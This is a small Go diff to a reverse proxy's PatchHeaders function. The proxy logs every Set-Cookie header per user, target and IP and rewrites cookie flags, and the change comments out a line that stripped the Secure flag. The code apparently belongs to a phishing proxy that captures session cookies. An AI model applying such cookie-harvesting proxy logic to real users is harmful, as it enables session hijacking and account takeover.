@@ -225,10 +225,10 @@ func (httpResponse *HTTPResponse) PatchHeaders(p *ReverseProxy) {
 		log.Cookies(p.RequestContext.UserID, p.Target.String(), httpResponse.Header["Set-Cookie"], p.IP)
 
 		for i, v := range httpResponse.Header["Set-Cookie"] {
-			//strip out the secure Flag
-			r := strings.NewReplacer("Secure", "", "secure", "")
-			cookie := r.Replace(v)
-			cookie = runtime.RegexpFindSetCookie.ReplaceAllStringFunc(cookie, runtime.TranslateSetCookie)
+			//strip out the secure Flag - commented out as a hotfix for Chrome 80+
+			//r := strings.NewReplacer("Secure", "", "secure", "")
+			//cookie := r.Replace(v)
+			cookie := runtime.RegexpFindSetCookie.ReplaceAllStringFunc(v, runtime.TranslateSetCookie)
 			log.Debugf("Rewriting Set-Cookie Flags: from \n[%s]\n --> \n[%s]\n", httpResponse.Header["Set-Cookie"][i], cookie)
 			httpResponse.Header["Set-Cookie"][i] = cookie
 		}
